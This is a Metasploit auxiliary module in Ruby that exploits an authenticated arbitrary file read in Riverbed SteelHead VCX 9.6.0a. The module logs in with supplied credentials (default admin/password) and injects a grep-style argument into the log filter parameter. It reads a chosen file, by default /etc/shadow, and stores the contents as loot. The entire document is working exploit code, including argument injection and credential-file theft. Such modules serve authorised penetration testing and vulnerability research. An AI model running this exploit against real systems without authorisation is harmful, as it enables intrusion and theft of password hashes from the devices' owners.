##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Riverbed SteelHead VCX File Read',
      'Description'    => %q{
          This module exploits an authenticated arbitrary file read in the log module's filter engine.
          SteelHead VCX (VCX255U) version 9.6.0a was confirmed as vulnerable.
      },
      'References'     =>
        [
          ['EDB', '42101']
        ],
      'Author'         =>
        [
          'Gregory DRAPERI <gregory.draper_at_gmail.com>', # Exploit
          'h00die' # Module
        ],
      'DisclosureDate' => 'Jun 01 2017',
      'License'        =>  MSF_LICENSE
    )

    register_options(
      [
        OptString.new('FILE', [ true,  'Remote file to view', '/etc/shadow']),
        OptString.new('TARGETURI', [true, 'Vulnerable URI path', '/']),
        OptString.new('USERNAME', [true, 'Username', 'admin']),
        OptString.new('PASSWORD', [true, 'Password', 'password']),
      ])
  end

  def run_host(ip)
    # pull our csrf
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], 'login'),
      'method' => 'GET',
      'vars_get' => {
        'next' => '/'
      }
    }, 25)

    unless res
      print_error("#{full_uri} - Connection timed out")
      return
    end

    cookie = res.get_cookies
    csrf = cookie.scan(/csrftoken=(\w+);/).flatten[0]
    vprint_status("CSRF Token: #{csrf}")

    # authenticate
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], 'login'),
      'method' => 'POST',
      'cookie' => cookie,
      'vars_post' => {
        'csrfmiddlewaretoken' => csrf,
        '_fields' => JSON.generate({
          'username' => datastore['USERNAME'],
          'password' => datastore['PASSWORD'],
          'legalAccepted' => 'N/A',
          'userAgent' => ''
          })
      }
    }, 25)

    unless res
      print_error("#{full_uri} - Connection timed out")
      return
    end

    if res.code == 400
      print_error('Failed Authentication')
      return
    elsif res.code == 200
      vprint_good('Authenticated Successfully')
      cookie = res.get_cookies
      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'], proof: cookie)
    end

    # pull the file
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], 'modules/common/logs'),
      'method' => 'GET',
      'cookie' => cookie,
      'vars_get' => {
        'filterStr' => "msg:-e .* #{datastore['FILE']}"
      }
    }, 25)

    unless res
      print_error("#{full_uri} - Connection timed out")
      return
    end

    if res && res.body
      result = res.get_json_document
      unless result.has_key?('web3.model')
        print_error('Invalid JSON returned')
        return
      end
      reconstructed_file = []
      # so the format is super icky here.  It makes a hash table for each row in the file. then the 'msg' field starts with
      # the file name.  It also, by default, includes other files, so we need to check we're on the right file.
      result['web3.model']['messages']['rows'].each do |row|
        if row['msg'].start_with?(datastore['FILE'])
          reconstructed_file << row['msg'].gsub("#{datastore['FILE']}:",'').strip
        end
      end
      if reconstructed_file.any?
        reconstructed_file = reconstructed_file.join("\n")
        vprint_good("File Contents:\n#{reconstructed_file}")
        stored_path = store_loot('host.files', 'text/plain', rhost, reconstructed_file, datastore['FILE'])
        print_good("Stored #{datastore['FILE']} to #{stored_path}")
      else
        print_error("File not found or empty file: #{datastore['FILE']}")
      end
    end
  end
end
